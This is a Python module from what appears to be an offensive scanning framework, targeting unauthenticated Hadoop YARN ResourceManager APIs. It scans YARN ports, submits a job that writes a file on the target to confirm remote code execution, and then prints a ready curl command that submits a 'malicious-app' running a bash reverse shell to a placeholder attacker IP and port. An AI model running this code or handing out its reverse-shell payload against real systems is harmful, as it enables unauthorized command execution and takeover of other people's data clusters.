import sys
import os
import socket
import time

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.base_module import BaseModule
from utils.colors import *
class HadoopYARNModule(BaseModule):
    
    def __init__(self, frontdoor):
        super().__init__(frontdoor)
        self.name = "Hadoop YARN RCE"
        self.port = 8088
    


    def run(self):
        """Check for Hadoop YARN ResourceManager RCE"""
        module_name = "Hadoop YARN RCE"
        target = self.get_target()
        
        print(f"\n[*] Testing {target} for Hadoop YARN...")
        
        # Common YARN ports: 8088 (ResourceManager), 8032 (ResourceManager), 8042 (NodeManager)
        ports = [8088, 8032, 8042]
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    self.log(module_name, "POTENTIAL", 
                                  f"Service on port {port}")
                    
                    if port == 8088:
                        self.check_yarn_resourcemanager(target)
                    elif port == 8042:
                        self.check_yarn_nodemanager(target)
                        
            except:
                continue
    
    def check_yarn_resourcemanager(self, target):
        """Check YARN ResourceManager REST API"""
        import urllib.request
        import json
        
        try:
            # Check cluster info
            url = f"http://{target}:8088/ws/v1/cluster/info"
            req = urllib.request.Request(url, method='GET')
            req.add_header('Accept', 'application/json')
            
            response = urllib.request.urlopen(req, timeout=5)
            data = json.loads(response.read())
            
            if 'clusterInfo' in data:
                self.log("Hadoop YARN RCE", "VULNERABLE", 
                              f"YARN ResourceManager accessible: {url}")
                
                # Check if we can submit applications
                self.test_yarn_app_submission(target)
                
        except Exception as e:
            pass
    
    def test_yarn_app_submission(self, target):
        """Test if we can submit applications to YARN"""
        import urllib.request
        import json
        
        try:
            # Test app submission endpoint
            url = f"http://{target}:8088/ws/v1/cluster/apps"
            
            # Simple test application
            app_data = {
                "application-id": "application_123456789_0001",
                "application-name": "test-app",
                "am-container-spec": {
                    "commands": {
                        "command": "echo test > /tmp/yarn_test.txt"
                    }
                },
                "application-type": "YARN"
            }
            
            req = urllib.request.Request(url, 
                                       data=json.dumps(app_data).encode(),
                                       method='POST')
            req.add_header('Content-Type', 'application/json')
            
            try:
                response = urllib.request.urlopen(req, timeout=5)
                
                if response.getcode() == 202 or response.getcode() == 200:
                    self.log("Hadoop YARN RCE", "RCE_CONFIRMED", 
                                  "Can submit applications - RCE possible")
                    
                    print("""
    [*] YARN RCE Exploitation:
    
    Submit application with command:
    ```bash
    curl -X POST -H "Content-Type: application/json" \\
         -d '{
           "application-id": "app-1",
           "application-name": "malicious-app",
           "am-container-spec": {
             "commands": {
               "command": "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
             }
           }
         }' http://""" + target + """:8088/ws/v1/cluster/apps
    ```
                    """)
                    
            except urllib.error.HTTPError as e:
                if e.code == 403:
                    self.log("Hadoop YARN RCE", "PROTECTED", 
                                  "App submission requires auth")
                    
        except Exception as e:
            pass